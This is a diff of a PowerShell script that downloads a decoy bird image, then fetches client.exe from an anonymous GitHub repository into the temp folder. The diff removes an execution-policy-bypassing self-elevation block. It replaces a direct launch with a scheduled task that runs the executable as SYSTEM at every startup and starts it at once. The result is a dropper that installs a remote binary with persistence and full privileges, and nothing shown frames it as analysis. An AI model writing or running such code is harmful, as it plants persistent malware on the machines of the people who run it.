@@ -1,10 +1,3 @@
-# Check if the script is running with admin privileges
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    # Relaunch the script with admin privileges
-    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
-
 # Download the image
 Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
 
@@ -16,5 +9,14 @@ $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.ex
 $exePath = "$env:TEMP\client.exe"
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-# Run the downloaded client.exe
-Start-Process $exePath
+# Create a scheduled task to run the client.exe with elevated privileges
+$taskName = "RunClientWithElevatedPrivileges"
+$action = New-ScheduledTaskAction -Execute $exePath
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
+
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+
+# Run the scheduled task immediately
+Start-ScheduledTask -TaskName $taskName
